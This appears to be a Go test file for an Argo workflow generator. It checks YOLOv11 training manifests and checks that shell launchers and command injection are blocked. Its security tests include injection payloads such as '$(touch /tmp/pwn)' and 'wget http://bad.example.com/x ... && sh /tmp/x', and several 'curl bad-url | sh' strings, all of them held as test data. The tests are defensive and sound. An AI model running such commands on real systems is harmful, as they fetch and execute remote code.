package argo

import (
	"strings"
	"testing"
)

func TestGenerateWorkflowYOLOv11(t *testing.T) {
	manifest, summary, err := GenerateWorkflow(WorkflowRequest{
		Name:      "train-yolov11",
		Namespace: "ml",
		Task:      "train",
		Model:     "yolov11",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"apiVersion: argoproj.io/v1alpha1",
		"kind: Workflow",
		"name: train-yolov11",
		"namespace: ml",
		"ultralytics/ultralytics:latest",
		"model=yolo11n.pt",
	} {
		if !strings.Contains(manifest, want) {
			t.Fatalf("manifest missing %q:\n%s", want, manifest)
		}
	}
	if !strings.Contains(summary, "train-yolov11") {
		t.Fatalf("summary=%q", summary)
	}
}

func TestInferModelFromPrompt(t *testing.T) {
	if got := InferModelFromPrompt("train a yolov11 model"); got != "yolov11" {
		t.Fatalf("got=%q", got)
	}
}

func TestGenerateWorkflowRequiresImageOrModel(t *testing.T) {
	_, _, err := GenerateWorkflow(WorkflowRequest{Name: "demo"})
	if err == nil {
		t.Fatal("expected error")
	}
}

func TestGenerateWorkflowRejectsShellLauncherCommand(t *testing.T) {
	_, _, err := GenerateWorkflow(WorkflowRequest{
		Name:    "train",
		Image:   "python:3.11-slim",
		Command: []string{"/bin/sh", "-c"},
		Args:    []string{"echo hi"},
	})
	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
		t.Fatalf("err=%v", err)
	}
}

func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
	manifest, _, err := GenerateWorkflow(WorkflowRequest{
		Name:  "train-custom",
		Model: "custom-model-1",
	})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, " -c") {
		t.Fatalf("manifest should avoid shell launcher:\n%s", manifest)
	}
	if !strings.Contains(manifest, "command:") || !strings.Contains(manifest, "- echo") {
		t.Fatalf("manifest=%s", manifest)
	}
}

// TestGenerateWorkflowInjectionShapedModelIsArgvSafe covers acceptance criterion 2 of SEC-006:
// injection-shaped model strings must be passed as literal argv args, never evaluated by a shell.
func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
	maliciousModels := []string{
		"$(touch /tmp/pwn)",
		"`id`",
		"model; curl bad-url | sh",
		"model && wget http://bad.example.com/x -O /tmp/x && sh /tmp/x",
	}
	for _, model := range maliciousModels {
		manifest, _, err := GenerateWorkflow(WorkflowRequest{
			Name:  "train-custom",
			Model: model,
		})
		if err != nil {
			t.Fatalf("model=%q: unexpected error: %v", model, err)
		}
		// Must use echo (argv-safe), never sh/bash/shell launcher
		if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, "bash -c") {
			t.Fatalf("model=%q: manifest uses shell launcher:\n%s", model, manifest)
		}
		if !strings.Contains(manifest, "- echo") {
			t.Fatalf("model=%q: manifest missing expected echo command:\n%s", model, manifest)
		}
	}
}

// TestGenerateWorkflowRejectsShellLauncherArgsBypass verifies split command/args
// shell launcher bypass attempts (e.g. command=["/bin/sh"], args=["-c", "..."]) are blocked.
func TestGenerateWorkflowRejectsShellLauncherArgsBypass(t *testing.T) {
	_, _, err := GenerateWorkflow(WorkflowRequest{
		Name:    "train",
		Image:   "python:3.11-slim",
		Command: []string{"/bin/sh"},
		Args:    []string{"-c", "curl bad-url | sh"},
	})
	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
	}

	_, _, err = GenerateWorkflow(WorkflowRequest{
		Name:    "train",
		Image:   "python:3.11-slim",
		Command: []string{"bash"},
		Args:    []string{"-c", "curl bad-url | sh"},
	})
	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
	}

	// Test extra execution flag variants (-lc, -ec, -elc, -xc) requested in review
	extraFlags := []string{"-lc", "-ec", "-elc", "-xc"}
	for _, flag := range extraFlags {
		_, _, err = GenerateWorkflow(WorkflowRequest{
			Name:    "train",
			Image:   "python:3.11-slim",
			Command: []string{"/bin/sh"},
			Args:    []string{flag, "curl bad-url | sh"},
		})
		if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
			t.Fatalf("expected error for shell launcher bypass flag %q, got: %v", flag, err)
		}

		_, _, err = GenerateWorkflow(WorkflowRequest{
			Name:    "train",
			Image:   "python:3.11-slim",
			Command: []string{"zsh", flag},
			Args:    []string{"curl bad-url | sh"},
		})
		if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
			t.Fatalf("expected error for shell launcher bypass flag %q in command, got: %v", flag, err)
		}
	}
}
